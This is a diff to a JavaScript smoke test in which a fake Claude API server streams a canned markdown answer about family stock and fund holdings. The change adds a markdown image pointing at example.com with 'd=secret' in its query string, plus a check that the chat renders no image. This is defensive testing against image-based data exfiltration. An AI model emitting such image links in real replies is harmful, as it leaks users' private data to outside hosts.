@@ -28,7 +28,7 @@ const fakeClaude = createServer((req, res) => {
     const first = ++apiCalls % 2 === 1
     const message = { id: `msg_${apiCalls}`, type: 'message', role: 'assistant', model: 'claude-opus-5-5', content: [], stop_reason: null, stop_sequence: null, usage }
     const block = first ? { type: 'tool_use', id: `toolu_${apiCalls}`, name: 'holdings', input: {} } : { type: 'text', text: '' }
-    const delta = first ? { type: 'input_json_delta', partial_json: '{"who":"family"}' } : { type: 'text_delta', text: 'Smoke answer: **₹5.3 L** in all.\n\n| Kind | Value |\n|---|---:|\n| Stocks | ₹3.1 L |\n| Funds | ₹2.2 L |\n\n- first point\n- second point' }
+    const delta = first ? { type: 'input_json_delta', partial_json: '{"who":"family"}' } : { type: 'text_delta', text: 'Smoke answer: **₹5.3 L** in all.\n\n| Kind | Value |\n|---|---:|\n| Stocks | ₹3.1 L |\n| Funds | ₹2.2 L |\n\n- first point\n- second point\n\n![leak](https://example.com/x.png?d=secret)' }
     res.writeHead(200, { 'Content-Type': 'text/event-stream' })
     for (const [type, data] of [
       ['message_start', { message }],
@@ -300,7 +300,7 @@ await clickText(`${chat} button`, 'Ask')
 await sleep(3000)
 // The answer is markdown: it must show as bold, a table and a list, not as ** and | characters.
 const answered = await ev(
-  `(() => { const el = document.querySelector('${chat}'); const t = el?.innerText ?? ''; return t.includes('Smoke answer') && !t.includes('**') && !!el.querySelector('strong') && el.querySelectorAll('table td').length === 4 && el.querySelectorAll('ul li').length >= 2 })()`
+  `(() => { const el = document.querySelector('${chat}'); const t = el?.innerText ?? ''; return t.includes('Smoke answer') && !t.includes('**') && !!el.querySelector('strong') && el.querySelectorAll('table td').length === 4 && el.querySelectorAll('ul li').length >= 2 && !el.querySelector('img') })()`
 )
 if (!answered) failures++
 console.log((answered ? 'ok   ' : 'FAIL ') + 'chat: answer rendered as markdown (bold, table, list)')
